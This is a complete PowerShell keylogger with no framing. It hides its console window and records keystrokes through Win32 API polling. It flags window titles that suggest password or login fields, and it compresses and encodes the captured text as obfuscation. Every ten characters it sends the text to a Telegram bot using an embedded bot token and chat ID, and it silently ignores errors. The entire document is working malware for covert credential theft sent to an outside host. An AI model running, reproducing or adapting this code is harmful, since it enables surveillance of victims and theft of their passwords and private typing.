Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Stealth {
    [DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@

$consolePtr = [Stealth]::GetConsoleWindow()
[Stealth]::ShowWindow($consolePtr, 0)

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public class WinAPI {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int k);
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
}
"@

# configure Telegram
$token = "8665518944:AAGN4ncP375c0rNFEsXiaOBN9G-0scYJ2qg"
$chatId = "8298670259"

function Compress-Text {
    param([string]$Text)
    try {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($Text)
        $ms = New-Object System.IO.MemoryStream
        $gzip = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Compress)
        $gzip.Write($bytes, 0, $bytes.Length)
        $gzip.Close()
        return [Convert]::ToBase64String($ms.ToArray())
    } catch {
        return [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Text))
    }
}

function Send-Telegram {
    param([string]$Message)
    try {
        # Obfuscation: Compress and encode in Base64
        $compressedMessage = Compress-Text $Message
        $body = @{chat_id=$chatId; text=$compressedMessage} | ConvertTo-Json
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendMessage" -Method Post -Body $body -ContentType "application/json" -TimeoutSec 3
    } catch {
        # Silent Error Handling
    }
}

function Get-ActiveWindow {
    $buffer = New-Object Text.StringBuilder 256
    $handle = [WinAPI]::GetForegroundWindow()
    $null = [WinAPI]::GetWindowText($handle, $buffer, 256)
    return $buffer.ToString()
}

Send-Telegram "Keylogger ACTIVATED - $(Get-Date)"

$buffer = ""
$lastSendTime = Get-Date
$keyStates = @{}
$currentWindow = ""
$lastWindow = ""

Write-Host "Keylogger - RUNNING"
Write-Host "Sending every 10 characters with obfuscation..."
Write-Host "Press CTRL+C to stop"

try {
    while ($true) {
        Start-Sleep -Milliseconds 10
        
        # Detect Active Window
        $currentWindow = Get-ActiveWindow
        if ($currentWindow -ne $lastWindow -and $currentWindow -ne "") {
            if ($buffer.Length -gt 0) {
                Send-Telegram "[$lastWindow] $buffer"
                $buffer = ""
            }
            
            # Sensitive Field Detection
            $sensitiveKeywords = @("password", "login", "credential", "pwd", "pass", "account", "user")
            $isSensitive = $false
            foreach ($keyword in $sensitiveKeywords) {
                if ($currentWindow -like "*$keyword*" -or $currentWindow -like "*$keyword.ToUpper()*") {
                    $isSensitive = $true
                    break
                }
            }
            
            if ($isSensitive) {
                Send-Telegram "SENSITIVE FIELD DETECTED: $currentWindow"
            } else {
                Send-Telegram "NEW WINDOW: $currentWindow"
            }
            $lastWindow = $currentWindow
        }
        
        $isShiftPressed = [WinAPI]::GetAsyncKeyState(16) -band 0x8000
        $isCapsLock = [Console]::CapsLock
        $isCtrlPressed = [WinAPI]::GetAsyncKeyState(17) -band 0x8000
        $isAltPressed = [WinAPI]::GetAsyncKeyState(18) -band 0x8000
        $currentTime = Get-Date
        
        $keyProcessed = $false
        
        # Combinations ALT GR
        if ($isCtrlPressed -and $isAltPressed) {
            # AltGr + 2 = @
            if ([WinAPI]::GetAsyncKeyState(50) -band 0x8000 -and -not $keyStates[500]) {
                $buffer += "@"
                $keyProcessed = $true
                $keyStates[500] = $true
                Start-Sleep -Milliseconds 80
            } elseif (-not ([WinAPI]::GetAsyncKeyState(50) -band 0x8000)) {
                $keyStates[500] = $false
            }
            
            # AltGr + 3 = #
            if ([WinAPI]::GetAsyncKeyState(51) -band 0x8000 -and -not $keyStates[501]) {
                $buffer += "#"
                $keyProcessed = $true
                $keyStates[501] = $true
                Start-Sleep -Milliseconds 80
            } elseif (-not ([WinAPI]::GetAsyncKeyState(51) -band 0x8000)) {
                $keyStates[501] = $false
            }
            
            # AltGr + 4 = ~
            if ([WinAPI]::GetAsyncKeyState(52) -band 0x8000 -and -not $keyStates[502]) {
                $buffer += "~"
                $keyProcessed = $true
                $keyStates[502] = $true
                Start-Sleep -Milliseconds 80
            } elseif (-not ([WinAPI]::GetAsyncKeyState(52) -band 0x8000)) {
                $keyStates[502] = $false
            }
            
            # AltGr + E = €
            if ([WinAPI]::GetAsyncKeyState(69) -band 0x8000 -and -not $keyStates[503]) {
                $buffer += "€"
                $keyProcessed = $true
                $keyStates[503] = $true
                Start-Sleep -Milliseconds 80
            } elseif (-not ([WinAPI]::GetAsyncKeyState(69) -band 0x8000)) {
                $keyStates[503] = $false
            }
        }
        
        # If AltGR was not processed, check normal keys
        if (-not $keyProcessed) {
            # Symbols with SHIFT
            if ($isShiftPressed) {
                # Shift + 1 = !
                if ([WinAPI]::GetAsyncKeyState(49) -band 0x8000 -and -not $keyStates[1001]) {
                    $buffer += "!"
                    $keyProcessed = $true
                    $keyStates[1001] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(49) -band 0x8000)) {
                    $keyStates[1001] = $false
                }
                
                # Shift + 2 = "
                if ([WinAPI]::GetAsyncKeyState(50) -band 0x8000 -and -not $keyStates[1002]) {
                    $buffer += '"'
                    $keyProcessed = $true
                    $keyStates[1002] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(50) -band 0x8000)) {
                    $keyStates[1002] = $false
                }
                
                # Shift + 3 = ·
                if ([WinAPI]::GetAsyncKeyState(51) -band 0x8000 -and -not $keyStates[1003]) {
                    $buffer += "·"
                    $keyProcessed = $true
                    $keyStates[1003] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(51) -band 0x8000)) {
                    $keyStates[1003] = $false
                }
                
                # Shift + 4 = $
                if ([WinAPI]::GetAsyncKeyState(52) -band 0x8000 -and -not $keyStates[1004]) {
                    $buffer += "$"
                    $keyProcessed = $true
                    $keyStates[1004] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(52) -band 0x8000)) {
                    $keyStates[1004] = $false
                }
                
                # Shift + 5 = %
                if ([WinAPI]::GetAsyncKeyState(53) -band 0x8000 -and -not $keyStates[1005]) {
                    $buffer += "%"
                    $keyProcessed = $true
                    $keyStates[1005] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(53) -band 0x8000)) {
                    $keyStates[1005] = $false
                }
                
                # Shift + 6 = &
                if ([WinAPI]::GetAsyncKeyState(54) -band 0x8000 -and -not $keyStates[1006]) {
                    $buffer += "&"
                    $keyProcessed = $true
                    $keyStates[1006] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(54) -band 0x8000)) {
                    $keyStates[1006] = $false
                }
                
                # Shift + 7 = /
                if ([WinAPI]::GetAsyncKeyState(55) -band 0x8000 -and -not $keyStates[1007]) {
                    $buffer += "/"
                    $keyProcessed = $true
                    $keyStates[1007] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(55) -band 0x8000)) {
                    $keyStates[1007] = $false
                }
                
                # Shift + 8 = (
                if ([WinAPI]::GetAsyncKeyState(56) -band 0x8000 -and -not $keyStates[1008]) {
                    $buffer += "("
                    $keyProcessed = $true
                    $keyStates[1008] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(56) -band 0x8000)) {
                    $keyStates[1008] = $false
                }
                
                # Shift + 9 = )
                if ([WinAPI]::GetAsyncKeyState(57) -band 0x8000 -and -not $keyStates[1009]) {
                    $buffer += ")"
                    $keyProcessed = $true
                    $keyStates[1009] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(57) -band 0x8000)) {
                    $keyStates[1009] = $false
                }
                
                # Shift + 0 = =
                if ([WinAPI]::GetAsyncKeyState(48) -band 0x8000 -and -not $keyStates[1010]) {
                    $buffer += "="
                    $keyProcessed = $true
                    $keyStates[1010] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(48) -band 0x8000)) {
                    $keyStates[1010] = $false
                }
            }
            
            # NÚMEROS NORMALES (solo si no hay Shift y no se procesó otra tecla)
            if (-not $keyProcessed -and -not $isShiftPressed) {
                for ($i = 48; $i -le 57; $i++) {
                    if ([WinAPI]::GetAsyncKeyState($i) -band 0x8000 -and -not $keyStates[$i]) {
                        $buffer += [char]$i
                        $keyProcessed = $true
                        $keyStates[$i] = $true
                        Start-Sleep -Milliseconds 80
                        break
                    } elseif (-not ([WinAPI]::GetAsyncKeyState($i) -band 0x8000)) {
                        $keyStates[$i] = $false
                    }
                }
            }
            
            # LETTERS (only if AltGr is not processed and no other key was processed)
            if (-not $keyProcessed -and -not ($isCtrlPressed -and $isAltPressed)) {
                for ($i = 65; $i -le 90; $i++) {
                    if ([WinAPI]::GetAsyncKeyState($i) -band 0x8000 -and -not $keyStates[$i]) {
                        if ($isShiftPressed -xor $isCapsLock) {
                            $buffer += [char]$i
                        } else {
                            $buffer += [char]::ToLower([char]$i)
                        }
                        $keyProcessed = $true
                        $keyStates[$i] = $true
                        Start-Sleep -Milliseconds 80
                        break
                    } elseif (-not ([WinAPI]::GetAsyncKeyState($i) -band 0x8000)) {
                        $keyStates[$i] = $false
                    }
                }
            }
            
            
            # Special Keys (only if no other key was processed)
            if (-not $keyProcessed) {
                # Space
                if ([WinAPI]::GetAsyncKeyState(32) -band 0x8000 -and -not $keyStates[32]) {
                    $buffer += " "
                    $keyProcessed = $true
                    $keyStates[32] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(32) -band 0x8000)) {
                    $keyStates[32] = $false
                }
                
                # Period
                if ([WinAPI]::GetAsyncKeyState(190) -band 0x8000 -and -not $keyStates[190]) {
                    $buffer += "."
                    $keyProcessed = $true
                    $keyStates[190] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(190) -band 0x8000)) {
                    $keyStates[190] = $false
                }
                
                # Coma
                if ([WinAPI]::GetAsyncKeyState(188) -band 0x8000 -and -not $keyStates[188]) {
                    $buffer += ","
                    $keyProcessed = $true
                    $keyStates[188] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(188) -band 0x8000)) {
                    $keyStates[188] = $false
                }
                
                # Semi-colon
                if ([WinAPI]::GetAsyncKeyState(186) -band 0x8000 -and -not $keyStates[186]) {
                    $buffer += ";"
                    $keyProcessed = $true
                    $keyStates[186] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(186) -band 0x8000)) {
                    $keyStates[186] = $false
                }
                
                # dash
                if ([WinAPI]::GetAsyncKeyState(189) -band 0x8000 -and -not $keyStates[189]) {
                    $buffer += "-"
                    $keyProcessed = $true
                    $keyStates[189] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(189) -band 0x8000)) {
                    $keyStates[189] = $false
                }
                
                # slash
                if ([WinAPI]::GetAsyncKeyState(191) -band 0x8000 -and -not $keyStates[191]) {
                    $buffer += "/"
                    $keyProcessed = $true
                    $keyStates[191] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(191) -band 0x8000)) {
                    $keyStates[191] = $false
                }
                
                # Backspace
                if ([WinAPI]::GetAsyncKeyState(8) -band 0x8000 -and -not $keyStates[8]) {
                    if ($buffer.Length -gt 0) {
                        $buffer = $buffer.Substring(0, $buffer.Length - 1)
                    }
                    $keyProcessed = $true
                    $keyStates[8] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(8) -band 0x8000)) {
                    $keyStates[8] = $false
                }
                
                # Enter
                if ([WinAPI]::GetAsyncKeyState(13) -band 0x8000 -and -not $keyStates[13]) {
                    $buffer += "[ENTER]"
                    $keyProcessed = $true
                    $keyStates[13] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(13) -band 0x8000)) {
                    $keyStates[13] = $false
                }
            }
        }
        
        # SEND EVERY 10 CHARACTERS
        if ($buffer.Length -ge 10) {
             Send-Telegram "[$currentWindow] $buffer"
             $buffer = ""
             $lastSendTime = $currentTime
         }
        
        # Security transmission every 60 seconds
        if (($currentTime - $lastSendTime).TotalSeconds -ge 60 -and $buffer.Length -gt 0) {
            Send-Telegram "[$currentWindow] [PENDING] $buffer"
            $buffer = ""
            $lastSendTime = $currentTime
        }
    }
} finally {
    if ($buffer.Length -gt 0) {
        Send-Telegram "[FINAL] $buffer"
    }
    Send-Telegram "Keylogger STOPPED - $(Get-Date)"
}
